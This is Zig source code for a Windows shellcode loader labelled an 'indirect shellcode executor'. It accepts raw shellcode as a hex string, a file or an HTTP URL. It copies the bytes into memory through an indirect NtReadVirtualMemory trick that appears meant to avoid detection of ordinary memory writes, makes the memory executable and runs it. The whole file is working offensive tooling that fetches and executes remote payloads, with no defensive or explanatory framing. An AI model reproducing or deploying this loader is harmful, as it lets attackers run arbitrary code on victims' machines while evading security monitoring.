// Compile: zig build-exe -lc -dynamic -fstrip -target x86_64-windows -O ReleaseFast src/indirect_shellcode.zig
const std = @import("std");
const windows = std.os.windows;

var PROGRAM_NAME: []const u8 = undefined;

const USAGE =
    \\Indirect shellcode executor
    \\
    \\USAGE: {s} [-s payload] [-f file_path] [-u url] [-e]
    \\
    \\Options:
    \\  -s paylaod      Payload to run ("\xde\xad\xbe\ef")
    \\  -f file_path    Path to a file containing the raw payload
    \\  -u url          Url to a http resource containing the raw payload
    \\
;

const ArgParseError = error{ MissingArgs, InvalidArgs, MissingPayload, InvalidCharacter };
const PayloadType = enum { string, path, url };

const Payload = union(PayloadType) {
    string: []u8,
    path: []u8,
    url: []u8,
    fn getPayload(self: Payload) []u8 {
        switch (self) {
            .string => |p| return p,
            .path => |p| return p,
            .url => |p| return p,
        }
    }

    fn GetType(self: Payload) PayloadType {
        return self;
    }
};

const CliArgs = struct {
    payload: ?Payload = null,
};

fn displayUsage() void {
    std.debug.print(USAGE, .{PROGRAM_NAME});
}

fn parseArgs(argv: [][:0]u8) ArgParseError!CliArgs {
    PROGRAM_NAME = std.fs.path.basename(argv[0]);
    // show help if no arg has been used
    if (argv.len == 1) {
        displayUsage();
    }

    var args = CliArgs{};
    var arg_counter: usize = 1;
    while (arg_counter < argv.len and argv[arg_counter][0] == '-') : (arg_counter += 1) {
        if (std.mem.eql(u8, argv[arg_counter], "-s")) {
            args.payload = Payload{ .string = argv[arg_counter + 1] };
            continue;
        }
        if (std.mem.eql(u8, argv[arg_counter], "-u")) {
            args.payload = Payload{ .url = argv[arg_counter + 1] };
            continue;
        }
        if (std.mem.eql(u8, argv[arg_counter], "-f")) {
            args.payload = Payload{ .path = argv[arg_counter + 1] };
            continue;
        }
    }

    return args;
}

fn readfile(allocator: std.mem.Allocator, p: []const u8) ![]const u8 {
    const file = try std.fs.openFileAbsolute(p, std.fs.File.OpenFlags{});
    defer file.close();
    const stat = try file.stat();

    const buffer = try allocator.alloc(u8, stat.size);
    var reader = std.fs.File.Reader.init(file, buffer);
    return try reader.interface.readAlloc(allocator, stat.size);
}

/// httpRequest keeps everything in memory
fn httpRequest(allocator: std.mem.Allocator, url: []const u8) ![]const u8 {
    var client = std.http.Client{ .allocator = allocator };
    defer client.deinit();

    var response_buffer = std.Io.Writer.Allocating.init(allocator);
    _ = try client.fetch(.{ .method = .GET, .location = .{ .url = url }, .response_writer = &response_buffer.writer });
    return try response_buffer.toOwnedSlice();
}

fn execute(address: *anyopaque, length: windows.SIZE_T) !void {
    var old_permissions: u32 = undefined;
    try windows.VirtualProtect(address, length, windows.PAGE_EXECUTE_READWRITE, &old_permissions);
    std.debug.print("Permissions of the memory map changed!\n", .{});

    std.debug.print("Executing shellcode\n", .{});

    const st = *const fn () void;
    const sf: st = @ptrCast(address);

    std.debug.print("shellcode function found at: 0x{x}", .{@intFromPtr(sf)});
    sf();
}

fn prepareString(allocator: std.mem.Allocator, payload: []const u8) ![]const u8 {
    if (payload.len == 0) return error.MissingPayload;
    // trim payload
    const tmp_payload = std.mem.trim(u8, payload, " \n");
    const count = std.mem.count(u8, tmp_payload, "\\x");

    const tmp_memory = try allocator.alloc(u8, payload.len - count);

    _ = std.mem.replace(u8, tmp_payload, "\\x", "", tmp_memory);

    // allocate memory
    const payload_memory = try allocator.alloc(u8, tmp_memory.len);

    var i: usize = 0;
    var j: usize = 0;
    while (i < tmp_memory.len) : (i += 2) {
        const byte_str = tmp_memory[i .. i + 2];
        const value = std.fmt.parseInt(u8, byte_str, 16) catch break;
        payload_memory[j] = value;
        j += 1;
    }
    return payload_memory;
}

pub fn getPayload(allocator: std.mem.Allocator, arg: *const ?Payload) ![]const u8 {
    if (arg.*) |p| {
        const payload = p.getPayload();
        switch (p.GetType()) {
            .url => return httpRequest(allocator, payload),
            .path => return readfile(allocator, payload),
            .string => {
                return prepareString(allocator, payload);
            },
        }
    } else {
        return error.MissingPayload;
    }
}

pub fn main() !void {
    var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);
    const allocator = arena.allocator();
    defer arena.deinit();

    const argv = try std.process.argsAlloc(allocator);

    const args = try parseArgs(argv);

    const payload = try getPayload(allocator, &args.payload);

    // create arbritrary memory to store payload
    // We add additional 50 bytes to support in memory decryption
    const mem_slice: []u8 = try allocator.alloc(u8, payload.len);
    const memory: *anyopaque = @ptrCast(mem_slice.ptr);
    // Cast pointer to memory pointer
    const memoryPtr: [*]const u8 = @ptrCast(memory);

    const process = windows.GetCurrentProcess();

    std.debug.print("Writing to address: {*}\n", .{memoryPtr});
    for (0..payload.len) |i| {
        // Increase payload address by 1
        const payload_usize: usize = @intCast(payload[i]);
        const payload_address = memoryPtr + i;
        const payload_addr: ?*usize = @ptrCast(@alignCast(@constCast(payload_address)));
        const status: windows.NTSTATUS = windows.ntdll.NtReadVirtualMemory(process, memory, memory, payload_usize, payload_addr);
        switch (status) {
            .SUCCESS => continue,
            else => {
                const err = windows.GetLastError();
                std.debug.print("Failed to write indirect memory: {s}\n", .{@tagName(err)});
                return error.FailedExecution;
            },
        }
    }

    try execute(memory, payload.len);
}
